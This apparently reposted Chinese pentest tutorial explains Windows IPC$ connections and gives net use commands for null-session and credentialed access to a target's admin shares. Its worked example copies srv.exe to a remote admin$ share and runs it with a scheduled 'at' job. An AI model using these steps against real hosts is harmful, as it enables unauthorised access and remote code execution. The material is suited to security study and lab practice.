> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/-mo-/p/11813608.html)

### 0x01 简介

Copy`IPC$(Internet Process Connection)`

是共享” 命名管道” 的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限, 在远程管理计算机和查看计算机的共享资源时使用。

Copy

利用

`IPC$`

, 连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。

### 0x02 利用条件

Copy

1.139,445 端口开启：ipc$ 连接可以实现远程登陆及对默认共享的访问; 而 139 端口的开启表示 netbios 协议的应用, 我们可以通过 139,445(win2000) 端口实现对共享文件 / 打印机的访问, 因此一般来讲,

`ipc$`

连接是需要 139 或 445 端口来支持的.

CopyCopyCopy

2. 管理员开启了默认共享：默认共享是为了方便管理员远程管理而默认开启的共享, 即所有的逻辑盘

`(c$,d$,e$……)`

和系统目录

`winnt或windows(admin$)`

, 我们通过

`ipc$`

连接可以实现对这些默认共享的访问

### 0x03 操作命令

#### 1. 建立 IPC$ 空连接

```
net use \\127.0.0.1\Iipc$ "" /user:""
```

#### 2. 建立完整的用户名，密码连接

```
net use \\127.0.0.1\ipc$ "password" /user:"username"
```

#### 3. 映射路径

```
net use z: \\127.0.0.1\c$ "密码" /user:"用户名"  (即可将对方的c盘映射为自己的z盘，其他盘类推)
```

#### 4. 访问 / 删除路径：

```
net use z: \\127.0.0.1\c$   #直接访问
net use c: /del     删除映射的c盘，其他盘类推 
net use * /del      删除全部,会有提示要求按y确认
```

#### 5. 删除 IPC$ 连接

```
net use \\127.0.0.1\ipc$ /del
```

#### 6. 域中进行 IPC$ 连接

```
net use\\去连接的IP地址\ipc$ "域成员密码"  /user:域名\域成员账号
net use\\192.168.100.1\ipc$ "admin123.." /user:momaek.com\win2003

dir \\momaek.com\c$

copy test.exe \\momaek.com\c$

net use \\192.168.100.1\ipc$ /del
```

### 0x04 使用实例

4.1 构建连接

```
C:\>net use \\127.0.0.1\IPC$ "" /user:"admintitrators"
```

这里密码原本就是为 "空"

4.2 上传 exe

```
C:\>copy srv.exe \\127.0.0.1\admin$
```

先复制 srv.exe 上去，（这里的 $ 是指 admin 用户的 c:\winnt\system32\，大家还可以使用 c$、d$，意思是 C 盘与 D 盘，这看你要复制到什么地方去了）。

4.3 查看时间

```
C:\>net time \\127.0.0.1
```

查查时间，发现 127.0.0.1 的当前时间是 2019/2/8 上午 11:00，命令成功完成。

4.4 运行程序

```
C:\>at \\127.0.0.1 11:05 srv.exe
```

用 at 命令启动 srv.exe 吧（这里设置的时间要比主机时间快，不然无法启动）

### 0x05 IPC$ 连接失败的原因

1. 你的系统不是 NT 或以上操作系统.  
2. 对方没有打开 ipc$ 默认共享。  
3. 不能成功连接目标的 139，445 端口.  
4. 命令输入错误.  
5. 用户名或密码错误.

### 0x06 常见错误号

1. 错误号 5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；  
2. 错误号 51，Windows 无法找到网络路径：网络有问题；  
3. 错误号 53，找不到网络路径：ip 地址错误；目标未开机；目标 lanmanserver 服务未启动；目标有防火墙（端口过滤）；  
4. 错误号 67，找不到网络名：你的 lanmanworkstation 服务未启动；目标删除了 ipc$；  
5. 错误号 1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个 ipc$，请删除再连。  
6. 错误号 1326，未知的用户名或错误密码：原因很明显了；  
7. 错误号 1792，试图登录，但是网络登录服务没有启动：目标 NetLogon 服务未启动。（连接域控会出现此情况）  
8. 错误号 2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。

### 0x07 其他知识点

```
net share       #查看自己的共享
net view \\IP   #查看target-IP的共享
netstat -A IP   #获取target-IP的端口列表

netstat -ano | findstr "port"  #查看端口号对应的PID
tasklist | findstr "PID"       #查看进程号对应的程序
```

参考链接：  
[https://www.cnblogs.com/bmjoker/p/10355934.html](https://www.cnblogs.com/bmjoker/p/10355934.html)